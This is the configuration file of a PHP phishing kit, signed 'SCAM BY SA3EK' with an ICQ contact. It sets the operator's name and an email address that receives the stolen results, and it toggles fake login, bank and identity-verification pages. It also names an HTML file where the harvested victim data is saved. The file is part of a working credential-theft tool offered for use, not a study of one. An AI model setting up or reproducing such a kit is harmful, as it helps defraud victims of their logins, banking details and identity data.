<?php
	error_reporting(E_ERROR | E_PARSE);
	/******
    SCAM BY SA3EK
    ICQ : 740900705
    *******/
	//Put your name.
	$sp_name = "Cb_Quatro";

	//Put your email to receive the result.
	$send_email = "zdingawe@gmail.com";

	//For use the old login put 'old', for the new login put 'new'.
	$login_theme = "new";

	//If you want to show Secure Page in scam put true, otherwise put false.
	$secure_page = false;

	//If you want to show Bank Page in scam put true, otherwise put false.
	$bank_page = false;

	//If you want to show Identity Page in scam put true, otherwise put false.
	$identity_page = true;

	//Please change the name of result file, For protect your result.
	$savefile_name = "cb4.html";

	//If you want to save result in HTML put true, otherwise put false.
	$save_result = True;

?>